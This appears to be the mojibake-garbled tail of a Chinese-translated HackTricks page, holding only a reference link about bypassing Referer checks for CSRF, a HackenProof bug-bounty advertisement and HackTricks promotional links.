* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof æ˜¯æ‰€æœ‰åŠ å¯†è´§å¸èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProof çš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨ web3 æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å®ƒå´›èµ·çš„æ—¥å­é‡ŒæŒæ¡ web3 å®‰å…¨ã€‚

**æˆä¸º web3 é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶å é¢†æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨ HackenProof ä¸Šæ³¨å†Œ**](https://hackenproof.com/register) å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šå—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ä¸Š **å…³æ³¨**æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
